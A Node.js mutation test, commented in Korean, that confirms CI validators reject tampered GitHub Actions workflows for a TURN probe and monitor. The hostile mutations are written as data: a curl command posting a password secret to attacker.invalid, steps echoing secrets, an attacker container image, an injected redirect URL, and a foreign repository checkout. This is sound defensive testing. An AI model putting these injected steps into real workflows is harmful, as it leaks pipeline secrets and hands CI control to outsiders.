#!/usr/bin/env node

import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseDocument } from 'yaml';

const repoRoot = new URL('../../', import.meta.url);
const probeValidatorPath = fileURLToPath(
  new URL('ops/ci/validate-external-turn-workflow.mjs', repoRoot),
);
const monitorValidatorPath = fileURLToPath(
  new URL('ops/ci/validate-external-turn-monitor.mjs', repoRoot),
);
const workflowSource = readFileSync(
  new URL('.github/workflows/external-turn-probe.yml', repoRoot),
  'utf8',
);
const monitorWorkflowSource = readFileSync(
  new URL('.github/workflows/external-turn-monitor.yml', repoRoot),
  'utf8',
);
const testRoot = mkdtempSync(join(tmpdir(), 'round-external-turn-contract-'));

function fail(message) {
  throw new Error(`외부 TURN 워크플로 계약 검사 실패: ${message}`);
}

function replaceRequired(source, searchValue, replacement, label) {
  const changed = source.replace(searchValue, replacement);
  if (changed === source) {
    fail(`${label} 변이가 워크플로를 변경하지 못했습니다`);
  }
  return changed;
}

function assertValidYaml(source, label) {
  const document = parseDocument(source, {
    prettyErrors: true,
    schema: 'core',
    uniqueKeys: true,
  });
  if (document.errors.length > 0) {
    fail(
      `${label} 변이의 YAML이 올바르지 않습니다: ${document.errors
        .map((error) => error.message)
        .join('; ')}`,
    );
  }
}

function assertBaseline(label, validatorPath) {
  const result = spawnSync(process.execPath, [validatorPath], {
    encoding: 'utf8',
  });
  if (result.status !== 0) {
    fail(`${label} 기준 검증이 실패했습니다: ${result.stderr}`);
  }
}

function assertRejected(validatorPath, label, workflow) {
  assertValidYaml(workflow, label);
  const workflowPath = join(testRoot, `${label}.yml`);
  writeFileSync(workflowPath, workflow);

  const result = spawnSync(process.execPath, [validatorPath, workflowPath], {
    encoding: 'utf8',
  });
  if (result.status === 0) {
    fail(`${label} 변이가 허용되었습니다`);
  }
}

try {
  assertBaseline('외부 TURN probe', probeValidatorPath);

  assertRejected(
    probeValidatorPath,
    'extra-trigger',
    replaceRequired(
      workflowSource,
      'on:\n  workflow_dispatch:',
      'on:\n  push:\n  workflow_dispatch:',
      'extra-trigger',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'floating-action',
    replaceRequired(
      workflowSource,
      /actions\/checkout@[0-9a-f]{40}/,
      'actions/checkout@v6',
      'floating-action',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'self-hosted-runner',
    replaceRequired(
      workflowSource,
      /runs-on: ubuntu-latest/g,
      'runs-on: self-hosted',
      'self-hosted-runner',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'job-container',
    replaceRequired(
      workflowSource,
      '    environment: round-pilot\n',
      '    environment: round-pilot\n    container: attacker.invalid/probe:latest\n',
      'job-container',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'extra-secret-step',
    replaceRequired(
      workflowSource,
      '      - name: 파일럿 증거 기록\n',
      [
        '      - name: 비밀번호 다시 읽기',
        '        shell: bash',
        '        env:',
        '          PASSWORD: ${{ secrets.ROUND_ACCESS_PASSWORD }}',
        '        run: echo "$PASSWORD"',
        '',
        '      - name: 파일럿 증거 기록',
        '',
      ].join('\n'),
      'extra-secret-step',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'inline-bracket-secret',
    replaceRequired(
      workflowSource,
      '        run: bash ops/turn/probe.sh',
      [
        '        run: |',
        '          bash ops/turn/probe.sh',
        '          echo "${{ secrets[\'ROUND_ACCESS_PASSWORD\'] }}"',
      ].join('\n'),
      'inline-bracket-secret',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'target-output-override',
    replaceRequired(
      workflowSource,
      'run: bash ops/turn/resolve-external-pilot-target.sh ops/turn/external-pilot-target.properties >>"$GITHUB_OUTPUT"',
      [
        'run: |',
        '          bash ops/turn/resolve-external-pilot-target.sh ops/turn/external-pilot-target.properties >>"$GITHUB_OUTPUT"',
        '          printf "round_url=https://attacker.invalid\\n" >>"$GITHUB_OUTPUT"',
      ].join('\n'),
      'target-output-override',
    ),
  );
  assertRejected(
    probeValidatorPath,
    'variable-bracket-access',
    replaceRequired(
      workflowSource,
      '${{ needs.release.outputs.round_url }}',
      '${{ vars["ROUND_URL"] }}',
      'variable-bracket-access',
    ),
  );

  assertBaseline('외부 TURN 상태 감시', monitorValidatorPath);
  assertRejected(
    monitorValidatorPath,
    'password-exfiltration',
    replaceRequired(
      monitorWorkflowSource,
      '          for attempt in 1 2 3; do',
      [
        '          curl --fail --data-binary "$ROUND_ACCESS_PASSWORD" https://attacker.invalid/',
        '          for attempt in 1 2 3; do',
      ].join('\n'),
      'password-exfiltration',
    ),
  );
  assertRejected(
    monitorValidatorPath,
    'checkout-target',
    replaceRequired(
      monitorWorkflowSource,
      '          persist-credentials: false',
      ['          persist-credentials: false', '          repository: attacker/monitor'].join('\n'),
      'checkout-target',
    ),
  );
  assertRejected(
    monitorValidatorPath,
    'password-secret-mutation',
    replaceRequired(
      monitorWorkflowSource,
      '${{ secrets.ROUND_ACCESS_PASSWORD }}',
      '${{ secrets.ATTACKER_CONTROLLED_PASSWORD }}',
      'password-secret-mutation',
    ),
  );
  process.stdout.write('외부 TURN 워크플로 변이 계약 검사를 통과했습니다.\n');
} finally {
  rmSync(testRoot, { recursive: true, force: true });
}
